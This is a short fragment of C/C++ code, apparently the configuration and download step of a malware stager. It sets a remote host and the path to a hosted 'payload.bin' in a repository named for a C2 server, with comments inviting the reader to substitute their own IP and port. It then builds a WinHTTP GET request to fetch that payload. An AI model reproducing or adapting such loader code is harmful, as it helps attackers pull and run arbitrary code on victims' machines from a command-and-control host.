...
{
    //--------- CONFIGURE -----------
    LPCWSTR remotehost = L"raw.githubusercontent.com"; //change to your IP
    int remoteport = INTERNET_DEFAULT_HTTPS_PORT; //change to your port
    LPCWSTR remotedir = L"/kimstars/BabyServerC2/main/payload.bin"; //change to your directory of the hosted bin file
    ...
    hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
